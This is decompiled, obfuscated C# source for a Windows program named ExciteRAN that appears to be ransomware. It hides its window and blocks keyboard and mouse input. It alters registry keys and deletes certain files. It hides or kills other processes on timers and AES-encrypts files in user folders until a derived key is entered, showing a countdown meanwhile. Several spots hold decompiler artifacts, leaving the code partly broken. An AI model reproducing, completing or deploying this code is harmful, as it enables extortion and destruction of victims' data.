using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ExciteRAN;

public class DatabaseTable : Form
{
	public class ActionToken
	{
		public static string CleanAssistant()
		{
			string text = File.ReadAllText(SymbolService.CleanAssistant(Environment.GetFolderPath((Environment.SpecialFolder)StoreType.RegisterNode(992)), PluginDictionary.CheckContext(138)));
			char newChar = text[StoreType.RegisterNode(996)];
			MD5 mD = MD5.Create();
			try
			{
				byte[] array = mD.ComputeHash(Encoding.UTF8.GetBytes(text));
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = StoreType.RegisterNode(1000); i < (int)(nuint)RegistryLayout.CleanAssistant(array); i += StoreType.RegisterNode(1004))
				{
					stringBuilder.Append(array[i].ToString(PluginDictionary.CheckContext(1913)));
				}
				while (true)
				{
					switch (1)
					{
					case 0:
						continue;
					}
					if (1 == 0)
					{
						/*OpCode not supported: LdMemberToken*/;
					}
					stringBuilder.Replace((char)StoreType.RegisterNode(1008), newChar);
					MD5 mD2 = MD5.Create();
					try
					{
						byte[] array2 = mD2.ComputeHash(Encoding.UTF8.GetBytes(stringBuilder.ToString()));
						StringBuilder stringBuilder2 = new StringBuilder();
						for (int j = StoreType.RegisterNode(1012); j < (int)(nuint)RegistryLayout.CleanAssistant(array2); j += StoreType.RegisterNode(1016))
						{
							stringBuilder2.Append(array2[j].ToString(PluginDictionary.CheckContext(1913)));
						}
						while (true)
						{
							switch (4)
							{
							case 0:
								continue;
							}
							return stringBuilder2.ToString();
						}
					}
					finally
					{
						if (mD2 != null)
						{
							while (true)
							{
								switch (1)
								{
								case 0:
									continue;
								}
								((IDisposable)mD2).Dispose();
								break;
							}
						}
					}
				}
			}
			finally
			{
				if (mD != null)
				{
					while (true)
					{
						switch (2)
						{
						case 0:
							continue;
						}
						((IDisposable)mD).Dispose();
						break;
					}
				}
			}
		}
	}

	public class ViewToken
	{
		public static byte[] CleanAssistant(byte[] windowPosition, byte[] parentLog)
		{
			byte[] result = StreamHelper.windowPosition;
			byte[] array = AssistantResolver.CleanAssistant(StoreType.RegisterNode(1020));
			RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
			byte[] salt = array;
			MemoryStream memoryStream = new MemoryStream();
			try
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				try
				{
					rijndaelManaged.KeySize = StoreType.RegisterNode(1024);
					rijndaelManaged.BlockSize = StoreType.RegisterNode(1028);
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(parentLog, salt, StoreType.RegisterNode(1032));
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / StoreType.RegisterNode(1036));
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / StoreType.RegisterNode(1040));
					rijndaelManaged.Mode = (CipherMode)StoreType.RegisterNode(1044);
					CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), (CryptoStreamMode)StoreType.RegisterNode(1048));
					try
					{
						cryptoStream.Write(windowPosition, StoreType.RegisterNode(1052), (int)(nuint)RegistryLayout.CleanAssistant(windowPosition));
						cryptoStream.Close();
					}
					finally
					{
						if (cryptoStream != null)
						{
							while (true)
							{
								switch (3)
								{
								case 0:
									continue;
								}
								if (1 == 0)
								{
									/*OpCode not supported: LdMemberToken*/;
								}
								((IDisposable)cryptoStream).Dispose();
								break;
							}
						}
					}
					result = memoryStream.ToArray();
				}
				finally
				{
					if (rijndaelManaged != null)
					{
						while (true)
						{
							switch (6)
							{
							case 0:
								continue;
							}
							((IDisposable)rijndaelManaged).Dispose();
							break;
						}
					}
				}
			}
			finally
			{
				if (memoryStream != null)
				{
					while (true)
					{
						switch (1)
						{
						case 0:
							continue;
						}
						((IDisposable)memoryStream).Dispose();
						break;
					}
				}
			}
			return result;
		}
	}

	public class ComponentManager
	{
		public static byte[] CleanAssistant(byte[] windowPosition, byte[] parentLog)
		{
			byte[] result = StreamHelper.windowPosition;
			byte[] array = AssistantResolver.CleanAssistant(StoreType.RegisterNode(1056));
			RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
			byte[] salt = array;
			MemoryStream memoryStream = new MemoryStream();
			try
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				try
				{
					rijndaelManaged.KeySize = StoreType.RegisterNode(1060);
					rijndaelManaged.BlockSize = StoreType.RegisterNode(1064);
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(parentLog, salt, StoreType.RegisterNode(1068));
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / StoreType.RegisterNode(1072));
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / StoreType.RegisterNode(1076));
					rijndaelManaged.Mode = (CipherMode)StoreType.RegisterNode(1080);
					CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), (CryptoStreamMode)StoreType.RegisterNode(1084));
					try
					{
						cryptoStream.Write(windowPosition, StoreType.RegisterNode(1088), (int)(nuint)RegistryLayout.CleanAssistant(windowPosition));
						cryptoStream.Close();
					}
					finally
					{
						if (cryptoStream != null)
						{
							while (true)
							{
								switch (2)
								{
								case 0:
									continue;
								}
								if (1 == 0)
								{
									/*OpCode not supported: LdMemberToken*/;
								}
								((IDisposable)cryptoStream).Dispose();
								break;
							}
						}
					}
					result = memoryStream.ToArray();
				}
				finally
				{
					if (rijndaelManaged != null)
					{
						while (true)
						{
							switch (3)
							{
							case 0:
								continue;
							}
							((IDisposable)rijndaelManaged).Dispose();
							break;
						}
					}
				}
			}
			finally
			{
				if (memoryStream != null)
				{
					while (true)
					{
						switch (1)
						{
						case 0:
							continue;
						}
						((IDisposable)memoryStream).Dispose();
						break;
					}
				}
			}
			return result;
		}
	}

	public class IconScope
	{
		public void CleanAssistant(string windowPosition, string parentLog)
		{
			byte[] windowPosition2 = File.ReadAllBytes(windowPosition);
			byte[] bytes = Encoding.UTF8.GetBytes(parentLog);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = ViewToken.CleanAssistant(windowPosition2, bytes);
			File.WriteAllBytes(windowPosition, bytes2);
		}
	}

	public class SelectionResolver
	{
		public void CleanAssistant(string windowPosition, string parentLog)
		{
			byte[] windowPosition2 = File.ReadAllBytes(windowPosition);
			byte[] bytes = Encoding.UTF8.GetBytes(parentLog);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = ComponentManager.CleanAssistant(windowPosition2, bytes);
			File.WriteAllBytes(windowPosition, bytes2);
		}
	}

	[CompilerGenerated]
	private sealed class TemplateScope
	{
		public DatabaseTable windowPosition;

		public DateTime parentLog;

		internal void RegisterNode(object windowPosition, EventArgs parentLog)
		{
			((Control)this.windowPosition.messageID).set_Text(DeploymentManager.CleanAssistant(TimeSpan.FromMinutes(StoreType.ProcessTemplate(1092)), DialogSettings.CleanAssistant(DateTime.Now, this.parentLog)).ToString(PluginDictionary.CheckContext(1918)));
		}
	}

	private const int windowPosition = 0;

	private const int parentLog = 5;

	private IContainer containerToken = QueueDesigner.windowPosition;

	private Label lineHandle;

	private Label currentContainer;

	private Timer parentOptions;

	private Timer captionCollection;

	private Timer nextSyncObject;

	private Timer parentData;

	private Timer messageToken;

	private PictureBox keywordsSet;

	private Label messageID;

	private Label session;

	private Label queryEnabled;

	private Label outputID;

	private Label variableCache;

	private Label firstFont;

	private Label nextTimer;

	private Button activeOutput;

	private TextBox versionHandle;

	private Button generatorToken;

	private LinkLabel lastQuery;

	private LinkLabel dataHeader;

	public DatabaseTable()
	{
		UpdateResource();
		((Control)messageID).set_Text(TimeSpan.FromMinutes(StoreType.ProcessTemplate(980)).ToString());
	}

	[DllImport("User32", EntryPoint = "ShowWindow")]
	private static extern int ReduceDrive(int windowPosition, int parentLog);

	[DllImport("user32.dll", EntryPoint = "BlockInput")]
	private static extern bool RegisterBookmark(bool windowPosition);

	private void RemoveAction(int windowPosition)
	{
		Random random = new Random();
		char[] array = ConditionLoader.CleanAssistant(windowPosition);
		for (int i = StoreType.RegisterNode(0); i < windowPosition; i += StoreType.RegisterNode(4))
		{
			array[i] = PluginDictionary.CheckContext(67)[random.Next(PluginDictionary.CheckContext(67).Length)];
		}
		while (true)
		{
			switch (6)
			{
			case 0:
				continue;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			StreamWriter streamWriter = new StreamWriter(SymbolService.CleanAssistant(Environment.GetFolderPath((Environment.SpecialFolder)StoreType.RegisterNode(8)), PluginDictionary.CheckContext(138)), (byte)StoreType.RegisterNode(12) != 0);
			try
			{
				streamWriter.Write(array);
				return;
			}
			finally
			{
				if (streamWriter != null)
				{
					while (true)
					{
						switch (5)
						{
						case 0:
							continue;
						}
						((IDisposable)streamWriter).Dispose();
						break;
					}
				}
			}
		}
	}

	private void IncreaseClient(object windowPosition, FormClosingEventArgs parentLog)
	{
		((CancelEventArgs)(object)parentLog).Cancel = (byte)StoreType.RegisterNode(16) != 0;
	}

	private void NavigateNode(object windowPosition, EventArgs parentLog)
	{
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d7: Expected O, but got Unknown
		((Form)this).set_Opacity(StoreType.ProcessTemplate(20));
		((Control)this).set_Visible((byte)StoreType.RegisterNode(28) != 0);
		((Form)this).set_ShowInTaskbar((byte)StoreType.RegisterNode(32) != 0);
		RemoveAction(StoreType.RegisterNode(36));
		CheckPath();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PluginDictionary.CheckContext(181));
		registryKey.SetValue(PluginDictionary.CheckContext(296), StoreType.RegisterNode(40), (RegistryValueKind)StoreType.RegisterNode(44));
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(PluginDictionary.CheckContext(325));
		registryKey2.SetValue(PluginDictionary.CheckContext(368), "", (RegistryValueKind)StoreType.RegisterNode(48));
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey(PluginDictionary.CheckContext(387));
		registryKey3.SetValue(PluginDictionary.CheckContext(494), PluginDictionary.CheckContext(505), (RegistryValueKind)StoreType.RegisterNode(52));
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)StoreType.RegisterNode(56));
		IEnumerable<string> source = Directory.EnumerateFiles(SymbolService.CleanAssistant(folderPath, PluginDictionary.CheckContext(516)));
		Func<string, bool> func = _003C_003Ec.parentLog;
		if (func == null)
		{
			while (true)
			{
				switch (7)
				{
				case 0:
					continue;
				}
				break;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			func = (_003C_003Ec.parentLog = (string windowPosition) => ((uint)new FileInfo(windowPosition).Attributes & (uint)StoreType.RegisterNode(1100)) == (uint)StoreType.RegisterNode(1104));
		}
		string[] array = source.Where(func).ToArray();
		string[] array2 = array;
		for (int i = StoreType.RegisterNode(60); i < (int)(nuint)GroupSet.CleanAssistant(array2); i += StoreType.RegisterNode(64))
		{
			string path = array2[i];
			File.Delete(path);
		}
		DateTime parentLog2;
		while (true)
		{
			switch (7)
			{
			case 0:
				continue;
			}
			parentLog2 = DateTime.Now;
			Timer val = new Timer();
			val.set_Interval(StoreType.RegisterNode(68));
			Timer val2 = val;
			val2.add_Tick((EventHandler)delegate
			{
				((Control)messageID).set_Text(DeploymentManager.CleanAssistant(TimeSpan.FromMinutes(StoreType.ProcessTemplate(1092)), DialogSettings.CleanAssistant(DateTime.Now, parentLog2)).ToString(PluginDictionary.CheckContext(1918)));
			});
			val2.set_Enabled((byte)StoreType.RegisterNode(72) != 0);
			parentOptions.Start();
			captionCollection.Start();
			nextSyncObject.Start();
			parentData.Start();
			messageToken.Start();
			return;
		}
	}

	private void ExtractDrive(object windowPosition, EventArgs parentLog)
	{
		parentOptions.Stop();
		((Form)this).set_Opacity(StoreType.ProcessTemplate(76));
		((Control)this).set_Visible((byte)StoreType.RegisterNode(84) != 0);
		((Form)this).set_Size(new Size(StoreType.RegisterNode(88), StoreType.RegisterNode(92)));
		((Form)this).set_Location(new Point(StoreType.RegisterNode(96), StoreType.RegisterNode(100)));
		ExitComponent();
	}

	private void FormatDialog(object windowPosition, EventArgs parentLog)
	{
		captionCollection.Stop();
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)StoreType.RegisterNode(104));
		string path = SymbolService.CleanAssistant(folderPath, PluginDictionary.CheckContext(519));
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable(PluginDictionary.CheckContext(544));
		string text = Path.Combine(environmentVariable, PluginDictionary.CheckContext(567));
		string path2 = SymbolService.CleanAssistant(text, PluginDictionary.CheckContext(519));
		File.Delete(path2);
	}

	private void PrintForm(object windowPosition, EventArgs parentLog)
	{
		nextSyncObject.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		for (int i = StoreType.RegisterNode(108); i < (int)(nuint)Device.CleanAssistant(array); i += StoreType.RegisterNode(128))
		{
			Process process = array[i];
			int num;
			if (PackageTable.CleanAssistant(process.ProcessName, PluginDictionary.CheckContext(586)))
			{
				while (true)
				{
					switch (5)
					{
					case 0:
						continue;
					}
					break;
				}
				if (1 == 0)
				{
					/*OpCode not supported: LdMemberToken*/;
				}
				num = process.MainWindowHandle.ToInt32();
				ReduceDrive(num, StoreType.RegisterNode(112));
			}
			if (PackageTable.CleanAssistant(process.ProcessName, PluginDictionary.CheckContext(593)))
			{
				while (true)
				{
					switch (5)
					{
					case 0:
						continue;
					}
					break;
				}
				num = process.MainWindowHandle.ToInt32();
				ReduceDrive(num, StoreType.RegisterNode(116));
			}
			if (PackageTable.CleanAssistant(process.ProcessName, PluginDictionary.CheckContext(608)))
			{
				while (true)
				{
					switch (5)
					{
					case 0:
						continue;
					}
					break;
				}
				num = process.MainWindowHandle.ToInt32();
				ReduceDrive(num, StoreType.RegisterNode(120));
			}
			if (!PackageTable.CleanAssistant(process.ProcessName, PluginDictionary.CheckContext(635)))
			{
				continue;
			}
			while (true)
			{
				switch (1)
				{
				case 0:
					continue;
				}
				break;
			}
			num = process.MainWindowHandle.ToInt32();
			ReduceDrive(num, StoreType.RegisterNode(124));
		}
		while (true)
		{
			switch (6)
			{
			case 0:
				continue;
			}
			nextSyncObject.Start();
			return;
		}
	}

	private void CloneDeployment(object windowPosition, EventArgs parentLog)
	{
		parentData.Stop();
		SortGroup();
	}

	private void BuildNetwork(object windowPosition, EventArgs parentLog)
	{
		messageToken.Stop();
		Process[] array = BitmapOptions.windowPosition;
		array = Process.GetProcessesByName(PluginDictionary.CheckContext(646));
		Process[] array2 = array;
		for (int i = StoreType.RegisterNode(132); i < (int)(nuint)Device.CleanAssistant(array2); i += StoreType.RegisterNode(136))
		{
			Process process = array2[i];
			Process.Start(PluginDictionary.CheckContext(665), PluginDictionary.CheckContext(682));
			process.Kill();
		}
		while (true)
		{
			switch (1)
			{
			case 0:
				continue;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			((Form)this).Close();
			return;
		}
	}

	private void ChangePackage(object windowPosition, EventArgs parentLog)
	{
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
		if (PackageTable.CleanAssistant(((Control)versionHandle).get_Text(), ""))
		{
			while (true)
			{
				switch (2)
				{
				case 0:
					break;
				default:
					if (1 == 0)
					{
						/*OpCode not supported: LdMemberToken*/;
					}
					MessageBox.Show(PluginDictionary.CheckContext(697), PluginDictionary.CheckContext(724), (MessageBoxButtons)StoreType.RegisterNode(140), (MessageBoxIcon)StoreType.RegisterNode(144));
					return;
				}
			}
		}
		if (PackageTable.CleanAssistant(((Control)versionHandle).get_Text(), ActionToken.CleanAssistant()))
		{
			while (true)
			{
				switch (2)
				{
				case 0:
					break;
				default:
				{
					MessageBox.Show(PluginDictionary.CheckContext(743), PluginDictionary.CheckContext(780), (MessageBoxButtons)StoreType.RegisterNode(148), (MessageBoxIcon)StoreType.RegisterNode(152));
					RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PluginDictionary.CheckContext(181));
					registryKey.SetValue(PluginDictionary.CheckContext(296), "", (RegistryValueKind)StoreType.RegisterNode(156));
					RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey(PluginDictionary.CheckContext(387));
					registryKey2.SetValue(PluginDictionary.CheckContext(494), PluginDictionary.CheckContext(797), (RegistryValueKind)StoreType.RegisterNode(160));
					AttachComponent();
					Process[] array = BitmapOptions.windowPosition;
					array = Process.GetProcessesByName(PluginDictionary.CheckContext(646));
					Process[] array2 = array;
					for (int i = StoreType.RegisterNode(164); i < (int)(nuint)Device.CleanAssistant(array2); i += StoreType.RegisterNode(168))
					{
						Process process = array2[i];
						process.Kill();
					}
					while (true)
					{
						switch (2)
						{
						case 0:
							break;
						default:
							return;
						}
					}
				}
				}
			}
		}
		MessageBox.Show(PluginDictionary.CheckContext(697), PluginDictionary.CheckContext(724), (MessageBoxButtons)StoreType.RegisterNode(172), (MessageBoxIcon)StoreType.RegisterNode(176));
	}

	public static void CheckPath()
	{
		RegisterBookmark((byte)StoreType.RegisterNode(180) != 0);
	}

	public static void ExitComponent()
	{
		RegisterBookmark((byte)StoreType.RegisterNode(184) != 0);
	}

	private void RemoveCondition(object windowPosition, EventArgs parentLog)
	{
		Clipboard.SetText(((Control)session).get_Text());
	}

	private void LoadNode(object windowPosition, LinkLabelLinkClickedEventArgs parentLog)
	{
		Process.Start(PluginDictionary.CheckContext(822));
	}

	private static void SortGroup()
	{
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)StoreType.RegisterNode(188));
		string environmentVariable = Environment.GetEnvironmentVariable(PluginDictionary.CheckContext(544));
		string text = Path.Combine(environmentVariable, PluginDictionary.CheckContext(567));
		string[] files = Directory.GetFiles(SymbolService.CleanAssistant(folderPath, PluginDictionary.CheckContext(516)), PluginDictionary.CheckContext(905), (SearchOption)StoreType.RegisterNode(192));
		string[] files2 = Directory.GetFiles(SymbolService.CleanAssistant(text, PluginDictionary.CheckContext(516)), PluginDictionary.CheckContext(905), (SearchOption)StoreType.RegisterNode(196));
		IconScope iconScope = new IconScope();
		string text2 = ActionToken.CleanAssistant();
		for (int i = StoreType.RegisterNode(200); i < (int)(nuint)GroupSet.CleanAssistant(files); i += StoreType.RegisterNode(204))
		{
			iconScope.CleanAssistant(files[i], text2);
		}
		while (true)
		{
			switch (3)
			{
			case 0:
				continue;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			for (int j = StoreType.RegisterNode(208); j < (int)(nuint)GroupSet.CleanAssistant(files2); j += StoreType.RegisterNode(212))
			{
				iconScope.CleanAssistant(files2[j], text2);
			}
			while (true)
			{
				switch (3)
				{
				case 0:
					break;
				default:
					return;
				}
			}
		}
	}

	private static void AttachComponent()
	{
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)StoreType.RegisterNode(216));
		string environmentVariable = Environment.GetEnvironmentVariable(PluginDictionary.CheckContext(544));
		string text = Path.Combine(environmentVariable, PluginDictionary.CheckContext(567));
		string[] files = Directory.GetFiles(SymbolService.CleanAssistant(folderPath, PluginDictionary.CheckContext(516)), PluginDictionary.CheckContext(905), (SearchOption)StoreType.RegisterNode(220));
		string[] files2 = Directory.GetFiles(SymbolService.CleanAssistant(text, PluginDictionary.CheckContext(516)), PluginDictionary.CheckContext(905), (SearchOption)StoreType.RegisterNode(224));
		string[] files3 = Directory.GetFiles(PluginDictionary.CheckContext(908), PluginDictionary.CheckContext(905), (SearchOption)StoreType.RegisterNode(228));
		SelectionResolver selectionResolver = new SelectionResolver();
		string text2 = ActionToken.CleanAssistant();
		for (int i = StoreType.RegisterNode(232); i < (int)(nuint)GroupSet.CleanAssistant(files); i += StoreType.RegisterNode(236))
		{
			selectionResolver.CleanAssistant(files[i], text2);
		}
		while (true)
		{
			switch (4)
			{
			case 0:
				continue;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			for (int j = StoreType.RegisterNode(240); j < (int)(nuint)GroupSet.CleanAssistant(files2); j += StoreType.RegisterNode(244))
			{
				selectionResolver.CleanAssistant(files2[j], text2);
			}
			while (true)
			{
				switch (3)
				{
				case 0:
					break;
				default:
					return;
				}
			}
		}
	}

	private void ProcessIcon(object windowPosition, EventArgs parentLog)
	{
	}

	protected override void Dispose(bool disposing)
	{
		int num;
		if (disposing)
		{
			while (true)
			{
				switch (7)
				{
				case 0:
					continue;
				}
				break;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			num = ((containerToken > QueueDesigner.windowPosition) ? 1 : 0);
		}
		else
		{
			num = StoreType.RegisterNode(248);
		}
		if (num != 0)
		{
			while (true)
			{
				switch (6)
				{
				case 0:
					continue;
				}
				break;
			}
			containerToken.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void UpdateResource()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0189: Expected O, but got Unknown
		//IL_027a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0284: Expected O, but got Unknown
		//IL_05b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05bd: Expected O, but got Unknown
		//IL_06e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ec: Expected O, but got Unknown
		//IL_07bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c5: Expected O, but got Unknown
		//IL_0894: Unknown result type (might be due to invalid IL or missing references)
		//IL_089e: Expected O, but got Unknown
		//IL_0975: Unknown result type (might be due to invalid IL or missing references)
		//IL_097f: Expected O, but got Unknown
		//IL_0a62: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a6c: Expected O, but got Unknown
		//IL_0b4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b59: Expected O, but got Unknown
		//IL_0c89: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c93: Expected O, but got Unknown
		//IL_0dd5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ddf: Expected O, but got Unknown
		//IL_0f22: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f2c: Expected O, but got Unknown
		//IL_103c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1046: Expected O, but got Unknown
		//IL_110d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1117: Expected O, but got Unknown
		//IL_1169: Unknown result type (might be due to invalid IL or missing references)
		//IL_1173: Expected O, but got Unknown
		//IL_14db: Unknown result type (might be due to invalid IL or missing references)
		//IL_14e5: Expected O, but got Unknown
		containerToken = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(Type.GetTypeFromHandle(TemplateOptions.CleanAssistant()));
		lineHandle = new Label();
		currentContainer = new Label();
		parentOptions = new Timer(containerToken);
		captionCollection = new Timer(containerToken);
		nextSyncObject = new Timer(containerToken);
		parentData = new Timer(containerToken);
		messageToken = new Timer(containerToken);
		keywordsSet = new PictureBox();
		messageID = new Label();
		session = new Label();
		queryEnabled = new Label();
		outputID = new Label();
		variableCache = new Label();
		firstFont = new Label();
		nextTimer = new Label();
		activeOutput = new Button();
		versionHandle = new TextBox();
		generatorToken = new Button();
		lastQuery = new LinkLabel();
		dataHeader = new LinkLabel();
		((ISupportInitialize)keywordsSet).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lineHandle).set_AutoSize((byte)StoreType.RegisterNode(252) != 0);
		((Control)lineHandle).set_Font(new Font(PluginDictionary.CheckContext(915), StoreType.EnableForm(256), (FontStyle)StoreType.RegisterNode(260), (GraphicsUnit)StoreType.RegisterNode(264), (byte)StoreType.RegisterNode(268)));
		((Control)lineHandle).set_ForeColor(Color.White);
		((Control)lineHandle).set_Location(new Point(StoreType.RegisterNode(272), StoreType.RegisterNode(276)));
		((Control)lineHandle).set_Name(PluginDictionary.CheckContext(940));
		((Control)lineHandle).set_Size(new Size(StoreType.RegisterNode(280), StoreType.RegisterNode(284)));
		((Control)lineHandle).set_TabIndex(StoreType.RegisterNode(288));
		((Control)currentContainer).set_AutoSize((byte)StoreType.RegisterNode(292) != 0);
		((Control)currentContainer).set_Cursor(Cursors.get_Help());
		((Control)currentContainer).set_Font(new Font(PluginDictionary.CheckContext(949), StoreType.EnableForm(296), (FontStyle)StoreType.RegisterNode(300), (GraphicsUnit)StoreType.RegisterNode(304), (byte)StoreType.RegisterNode(308)));
		((Control)currentContainer).set_ForeColor(Color.White);
		((Control)currentContainer).set_Location(new Point(StoreType.RegisterNode(312), StoreType.RegisterNode(316)));
		((Control)currentContainer).set_Name(PluginDictionary.CheckContext(990));
		((Control)currentContainer).set_Size(new Size(StoreType.RegisterNode(320), StoreType.RegisterNode(324)));
		((Control)currentContainer).set_TabIndex(StoreType.RegisterNode(328));
		currentContainer.set_TextAlign((ContentAlignment)StoreType.RegisterNode(332));
		parentOptions.set_Enabled((byte)StoreType.RegisterNode(336) != 0);
		parentOptions.set_Interval(StoreType.RegisterNode(340));
		parentOptions.add_Tick((EventHandler)ExtractDrive);
		captionCollection.set_Enabled((byte)StoreType.RegisterNode(344) != 0);
		captionCollection.set_Interval(StoreType.RegisterNode(348));
		captionCollection.add_Tick((EventHandler)FormatDialog);
		nextSyncObject.set_Enabled((byte)StoreType.RegisterNode(352) != 0);
		nextSyncObject.set_Interval(StoreType.RegisterNode(356));
		nextSyncObject.add_Tick((EventHandler)PrintForm);
		parentData.set_Enabled((byte)StoreType.RegisterNode(360) != 0);
		parentData.set_Interval(StoreType.RegisterNode(364));
		parentData.add_Tick((EventHandler)CloneDeployment);
		messageToken.set_Enabled((byte)StoreType.RegisterNode(368) != 0);
		messageToken.set_Interval(StoreType.RegisterNode(372));
		messageToken.add_Tick((EventHandler)BuildNetwork);
		((Control)keywordsSet).set_BackColor(Color.FromArgb(StoreType.RegisterNode(376), StoreType.RegisterNode(380), StoreType.RegisterNode(384)));
		((Control)keywordsSet).set_Cursor(Cursors.get_No());
		keywordsSet.set_Image((Image)(object)AddinProvider.EXCITEran);
		((Control)keywordsSet).set_Location(new Point(StoreType.RegisterNode(388), StoreType.RegisterNode(392)));
		((Control)keywordsSet).set_Name(PluginDictionary.CheckContext(1003));
		((Control)keywordsSet).set_Size(new Size(StoreType.RegisterNode(396), StoreType.RegisterNode(400)));
		keywordsSet.set_SizeMode((PictureBoxSizeMode)StoreType.RegisterNode(404));
		keywordsSet.set_TabIndex(StoreType.RegisterNode(408));
		keywordsSet.set_TabStop((byte)StoreType.RegisterNode(412) != 0);
		((Control)messageID).set_AutoSize((byte)StoreType.RegisterNode(416) != 0);
		((Control)messageID).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(420), (FontStyle)StoreType.RegisterNode(424)));
		messageID.set_ImageAlign((ContentAlignment)StoreType.RegisterNode(428));
		((Control)messageID).set_Location(new Point(StoreType.RegisterNode(432), StoreType.RegisterNode(436)));
		((Control)messageID).set_Name(PluginDictionary.CheckContext(1069));
		((Control)messageID).set_RightToLeft((RightToLeft)StoreType.RegisterNode(440));
		((Control)messageID).set_Size(new Size(StoreType.RegisterNode(444), StoreType.RegisterNode(448)));
